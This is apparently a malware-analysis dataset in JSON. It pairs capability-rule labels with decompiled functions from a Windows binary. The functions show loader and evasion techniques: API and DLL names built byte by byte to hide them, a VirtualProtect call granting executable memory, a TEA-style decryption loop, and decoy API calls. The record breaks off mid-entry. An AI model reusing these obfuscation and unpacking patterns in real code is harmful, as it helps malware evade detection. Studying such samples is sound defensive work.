{
    "004028bc": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.004028bc(void)\n\n{\n    *0x43ce28 = 100;\n    *0x43ce1e = 0x6d;\n    *0x43ce2a = 0x6c;\n    *0x43ce26 = 0x2e;\n    *0x43ce2c = 0x6c;\n    *0x43ce24 = 0x32;\n    *0x43ce1c = 0x69;\n    *0x43ce18 = 0x6d;\n    *0x43ce1a = 0x73;\n    *0x43ce22 = 0x33;\n    *0x43ce2e = 0;\n    *0x43ce20 = 0x67;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x43ce18);\n    return;\n}\n",
        "token_count": 197
    },
    "0040297b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040297b(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    *arg_8h = *arg_8h ^ arg_ch;\n    return;\n}\n",
        "token_count": 55
    },
    "0040c278": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c278(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040c779;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040c3ad;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040c3b4;\ncode_r0x0040c3ad:\n                        do {\n                            var_4h = 1;\ncode_r0x0040c3b4:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040c3c2;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040c3c2:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x423784 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x423784 < iVar12) {\n                if (iVar12 < *0x423780) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x423780;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040c779;\n            }\n            var_10h = *0x423784 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040c565;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040c565:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040c779:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3669
    },
    "0040c7bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c7bc(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040ccbd;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x4237a0 - 1;\n        iVar4 = *0x4237a0 + (*0x4237a0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x4237a0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040c8f1;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040c8f8;\ncode_r0x0040c8f1:\n                        do {\n                            var_4h = 1;\ncode_r0x0040c8f8:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040c906;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040c906:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x42379c - *0x4237a0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x42379c < iVar12) {\n                if (iVar12 < *0x423798) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x4237ac;\n                    iVar4 = *0x4237a4 + (*0x4237a4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4237a4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x4237a4 + (*0x4237a4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4237a4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x4237ac + *0x423798;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040ccbd;\n            }\n            var_10h = *0x42379c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x4237a0 - 1;\n            iVar12 = *0x4237a0 + (*0x4237a0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x4237a0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040caa9;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040caa9:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x4237a4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040ccbd:\n    var_20h = iVar12 << (0x1fU - *0x4237a4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x4237a8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x4237a8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3664
    },
    "004029a0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004029a0(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t *extraout_EDX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint lpOutBuffer;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t lpBytesRead;\n    \n    var_18h = *arg_ch;\n    var_14h = arg_ch[1];\n    uVar2 = arg_8h[1];\n    var_10h = arg_ch[2];\n    var_1ch = arg_ch[3];\n    uVar3 = *arg_8h;\n    var_ch = -0x3910c8e0;\n    var_8h = uVar3;\n    if (*0x43ce14 == 0x60b) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0x4012a0, 0, 0, &lpOutBuffer, 0, &lpBytesRead, 0);\n    }\n    lpBytesRead = 0x20;\n    iVar1 = -0x3910c8e0;\n    do {\n        arg_8h = uVar3 * 0x10 + var_10h;\n        arg_ch = (uVar3 >> 5) + var_1ch;\n        *0x43c9c4 = 0xffcf03fc;\n        fcn.0040297b(&arg_8h, iVar1 + uVar3);\n        *0x43c9c4 = 0;\n        *0x43c9cc = 0xffffffff;\n        uVar2 = uVar2 - (arg_ch ^ arg_8h);\n        *0x43c9c8 = 0xff6b3619;\n        arg_ch = (uVar2 >> 5) + var_14h;\n        fcn.00402951(&var_8h, uVar2 * 0x10 + var_18h ^ iVar1 + uVar2 ^ arg_ch);\n        fcn.00402933(&var_ch, 0x9e3779b9);\n        lpBytesRead = lpBytesRead + -1;\n        iVar1 = var_ch;\n        uVar3 = var_8h;\n    } while (lpBytesRead != 0);\n    extraout_EDX[1] = uVar2;\n    *extraout_EDX = var_8h;\n    return;\n}\n",
        "token_count": 589
    },
    "00402ab0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ab0(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x43ce14 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)(0);\n        }\n        if (*0x43ce14 == 0x1c) {\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, 0x4012d4);\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)(0, 0);\n        }\n        fcn.004029a0(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00402c2a": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00402c2a(void)\n\n{\n    uint var_4h;\n    \n    *0x423bce = 0x33;\n    *0x423bcf = 0x32;\n    *0x423bd3 = 0x6c;\n    *0x423bd2 = 0x6c;\n    *0x423bcb = 0x6e;\n    *0x423bcd = 0x6c;\n    *0x423bc8 = 0x6b;\n    *0x423bcc = 0x65;\n    *0x423bca = 0x72;\n    *0x423bd0 = 0x2e;\n    *0x423bd1 = 100;\n    *0x423bc9 = 0x65;\n    *0x423bd4 = 0;\n    *0x43ce10 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x423bc8);\n    *0x423bd3 = 0x65;\n    *0x423bc9 = 0x69;\n    *0x423bcc = 0x75;\n    *0x423bce = 0x6c;\n    *0x423bcd = 0x61;\n    *0x423bd1 = 0x6f;\n    *0x423bd5 = 0x74;\n    *0x423bc8 = 0x56;\n    *0x423bd4 = 99;\n    *0x423bcf = 0x50;\n    *0x423bd6 = 0;\n    *0x423bcb = 0x74;\n    *0x423bd2 = 0x74;\n    *0x423bca = 0x72;\n    *0x423bd0 = 0x72;\n    *0x423bc4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x43ce10, 0x423bc8);\n    (**0x423bc4)(*0x43c9c0, *0x43ce14, 0x40, &var_4h);\n    return;\n}\n",
        "token_count": 477
    },
    "004056f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004057e5: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004057ea)\n// WARNING: Removing unreachable block (ram,0x00405818)\n// WARNING: Removing unreachable block (ram,0x004057f0)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004056f2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405214(0x412080, 0x18);\n    fcn.00409762(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x43d294 != 1) {\n        *0x43d290 = 1;\n        *0x43d28c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00404cf0(*0x43eeec);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00404cf0(*0x43eee8);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00404ce7();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00404cf0(*piVar2);\n                        iVar3 = fcn.00404ce7();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00404cf0(*0x43eeec);\n                        piVar1 = fcn.00404cf0(*0x43eee8);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0040562c(0x401258);\n        }\n        fcn.0040562c(0x401260);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00409688(8);\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "00408a05": {
        "rules": [
